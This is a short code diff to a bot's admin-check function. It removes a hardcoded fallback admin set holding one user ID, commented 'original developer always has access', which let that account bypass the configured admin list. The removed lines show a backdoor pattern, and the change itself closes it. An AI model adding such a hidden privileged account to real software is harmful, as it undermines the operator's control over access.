@@ -40,10 +40,8 @@ class AdminStates(StatesGroup):
 
 # ── Admin check ─────────────────────────────────────────────────────────────────
 
-_FALLBACK_ADMINS = {6390225218}   # original developer always has access
-
 def is_admin(user_id: int, config: Config) -> bool:
-    return user_id in config.admin_ids or user_id in _FALLBACK_ADMINS
+    return user_id in config.admin_ids
 
 
 # ── /admin command ──────────────────────────────────────────────────────────────
